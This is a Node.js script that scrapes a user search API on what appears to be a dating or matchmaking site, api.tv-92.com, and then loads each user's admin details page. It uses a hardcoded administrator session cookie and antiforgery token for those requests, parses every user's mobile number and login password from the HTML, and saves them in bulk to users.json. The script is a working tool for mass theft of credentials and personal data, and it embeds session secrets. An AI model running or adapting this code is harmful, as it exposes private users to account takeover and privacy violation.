const axios = require("axios");
const fs = require("fs");
const path = require('path');
const cheerio = require("cheerio");

const endpoint = 'https://api.tv-92.com';
const filename = path.join(__dirname, 'users.json');
const limit = 10;

const fetchUsers = async (page = 0) => {
    try {
        const response = await axios.default.get(
            `${endpoint}/Search?pageIndex=${page}&pageSize=${limit}`,
            {
                headers: {
                    "Content-Type": "application/json",
                    "Api-Request": "True",
                },
            }
        );

        if (response.data && response.data.returnData) {
            const { totalPages, items } = response.data.returnData;

            return {
                data: items,
                lastPage: totalPages,
            };
        }

        return {
            data: [],
            lastPage: 1,
        };
    } catch (error) {
        console.error(error)
        return {
            data: [],
            lastPage: 1,
        };
    }
};

const fetchUser = async (id) => {
    console.log(`Fetching user ${id}`);

    const options = {
        method: 'GET',
        url: 'https://api.tv-92.com/AdminSearch/Details',
        params: { userId: id },
        headers: {
            accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
            'cache-control': 'max-age=0',
            cookie: '_ga=GA1.1.821673171.1736446633; _ga_J5NQ8B5YKL=GS1.1.1736446632.1.1.1736447838.60.0.1031577703; .AspNetCore.Antiforgery.e8eFntpYNNk=CfDJ8Gqlvk98IMZIspRyOmf5gawrf7CsN_bYFvKvE2CKObjB_CmtE4IPryq__p7VHCdmBsiaEoW2dEtjBREttrDs5XuxQqw4LnmunC0Dt3WbmOIcMqsSPUOrfsGeuNBTVmkPeX1Dqbgl9QuyHsPChnCPW6s; CV=-191823911; .AspNetCore.Cookie=CfDJ8Gqlvk98IMZIspRyOmf5gaxqiTtRJ-vtoylqprNNqaqBdTzfreDvFzuIWrK78fiskKhJzXwdq2LCfKWk7qFySV6F7WmgDPgRmogzTIsnurLgVEc2aeEqN_mvl44Rf5GWPTTH7kxJW5mwxjGMYeJMGjCO21IskpBlFzQM3szPmsy26Y6T12-BMKDIuV0k3EBVpgg0wSw84jTprI2qZNSR-gxtbvmBPu4FsVr9Q9twFyhaWh5roglRDA8FsOf5NrLajKDOimpcVG-uM5aO0zzWng53qYueLFPWXkQt0wL25G4J_nkNiwV6y8xaU54ud5BoGIMxqElo6dxkEBk78-FkTLB1hJ0798R5F1FvAuNGzs6tASCTVdMMVhqK46icNa-kkxxaXYx18Epfp9UypQ5-pNvJ794uKn7mk1-Tdf4Xb94KGLK-LYu5cmX06BXrVVMdParS7ao65h27RyKilRzi3JBJ4XFk7Q60LcJdHevVsbeLH1JmsxaP38p0bERKv3G8SZhR68nch4_BjKVf_w3SDdZj-gOUgqmH8QMWUMn-ipzmZksYRYodhRH1G2YxyZ35BoIwgdZQUxJAaKIiGKb96i69tAJWPR5UrDBZ7Xn6xOGQ_JTa4U22vQsn9GO-I5x4C61NsfSI2wFdyFmKFqxJkodC8sjfBsAdogpAgGRw7FKAYJXZjCgl3ivduE6yqZ7HpXD66rftEoRfXp9Bb9ULOz0gclv_MiQY4nq7XqxkbSYMgZbqUAXAYpNasAldwzrYVl34upAHvIl0oMQ1pq1y7Rnc-XN232zc4ncxFR_fExaJ_S0wPAZwzJShK1p0LQ__vfOmvk3FKU16SnzWlF8spVNWesWm1kpft_ANE53XRPU3TvSjdKTNO6V6sadYq-QBO511SOgLceXlka47BlbJLpCJZDViZ9N9Iw5wJd5Gzh_a75P_rzH2ag6r90IzLncVaQqWQjYbtd-ZH8W80w-zyYpOq0vdA7PmEWeJ9FsZ8_JzjbM_XyX74ZubWiXYQLyStw6TJxK1WsD1mwOvznUapkoUHUzuTdFyxHhR_t60IaZIBMga9NIgInvejEB0EW4ljr_aWCKqVjtEnxoo7DOEwgM',
            priority: 'u=0, i',
            referer: 'https://api.tv-92.com/AdminSearch/Index?Id=&LatestUserLoginStatus=&HasSpecialAccount=&NameConfirmed=&Mobile=&Sexuality=&IsOnline=&UserImageConfirmed=&StartAge=&Province=&MaritalStatus=&HealthStatus=&EndAge=&City=&HasImage=&LifeStyle=&RobotType=&LatestPassword=&MobileConfirmed=&PageSize=12&pageIndex=1',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        }
    };

    const result = await axios.request(options);

    const $ = cheerio.load(result.data);

    const phone = $('body > div.wrapper > div.content-wrapper > section > div > div.row > div:nth-child(3) > div > div > div > div:nth-child(1)').text().trim().replace('شماره موبایل : ', '');
    const password = $('body > div.wrapper > div.content-wrapper > section > div > div.row > div:nth-child(3) > div > div > div > div:nth-child(2)').text().trim().replace('رمز ورود : ', '');

    return {
        phone,
        password
    }
}

const format = async (data) => {
    const { id } = data;

    const { phone, password } = await fetchUser(id);

    return {
        ...data,
        mobile: phone,
        password
    }
};

const fetchAllUsers = async () => {
    let output = [];
    let page = 0;

    while (true) {
        const { data, lastPage } = await fetchUsers(page);

        for (const item of data) {
            const formatted = await format(item);
            output.push(formatted);
        }

        if (page >= lastPage) {
            break;
        }

        console.log(`Fetched page ${page + 1}/${lastPage}`);
        fs.writeFileSync(filename, JSON.stringify(output, null, 2));

        page++;
    }

    return output;
};

fetchAllUsers().then((users) => {
    fs.writeFileSync(filename, JSON.stringify(users, null, 2));
});
